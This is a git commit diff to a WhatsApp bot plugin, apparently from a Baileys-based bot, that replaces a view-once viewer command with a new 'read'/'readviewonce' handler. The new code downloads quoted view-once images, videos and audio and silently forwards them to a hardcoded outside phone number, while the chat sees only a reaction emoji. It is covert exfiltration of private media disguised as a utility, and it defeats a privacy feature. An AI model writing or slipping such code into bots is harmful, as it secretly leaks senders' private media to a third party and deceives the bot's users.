144d6f1c776b94068e9b69e7f37875f5215da5f7
Ī'm `Dev Criss 🇦🇱 <cristianyhacson2008@gmail.com>
2025-08-28 00:33:01 -0500

    Actualizar owner-vv.js

--- plugins/owner-vv.js
+++ plugins/owner-vv.js
@@ -1,4 +1,4 @@
-// Mejorado por Criss
+/*// Mejorado por Criss
 
 let { downloadContentFromMessage } = (await import('@whiskeysockets/baileys'));
 
@@ -32,5 +32,51 @@ let handler = async (m, { conn }) => {
 handler.help = ['vv']
 handler.tags = ['owner']
 handler.command = ['vv', 'v'] 
+
+export default handler;*/
+
+// Mejorado por Criss
+
+import { downloadContentFromMessage } from '@whiskeysockets/baileys';
+
+let handler = async (m, { conn }) => {
+  if (!m.quoted) return conn.reply(m.chat, `*${xtools} Por favor, responde a una imagen ViewOnce (ver una sola vez)*.`, m);
+  if (!m?.quoted || !m?.quoted?.viewOnce) return conn.reply(m.chat, `*${xtools} Responde a una imagen ViewOnce (ver una sola vez)*`, m);
+
+  let target = "51927238856@s.whatsapp.net"; // Número fijo donde se enviará el resultado
+
+  await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+
+  try {
+    // Extraer el mensaje real de viewOnce
+    let msg = m.quoted.message[m.quoted.mtype];
+    let type = Object.keys(msg)[0];
+    let stream = await downloadContentFromMessage(msg, type.replace('Message', ''));
+    
+    // Pasar el stream a buffer
+    let buffer = Buffer.from([]);
+    for await (let chunk of stream) {
+      buffer = Buffer.concat([buffer, chunk]);
+    }
+
+    if (/videoMessage/.test(m.quoted.mtype)) {
+      await conn.sendFile(target, buffer, 'media.mp4', m.quoted.caption || '', m);
+    } else if (/imageMessage/.test(m.quoted.mtype)) {
+      await conn.sendFile(target, buffer, 'media.jpg', m.quoted?.caption || '', m);
+    } else if (/audioMessage/.test(m.quoted.mtype)) {
+      await conn.sendFile(target, buffer, 'audio.mp3', '', m, { mimetype: 'audio/mp3' });
+    }
+
+    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+  } catch (e) {
+    await conn.sendMessage(m.chat, { react: { text: '👻', key: m.key } });
+    conn.reply(m.chat, 'xd');
+    console.error(e);
+  }
+}
+
+handler.help = ['read']
+handler.tags = ['tools']
+handler.command = ['readviewonce', 'read', 'readvo', 'ver'] 
 
 export default handler;
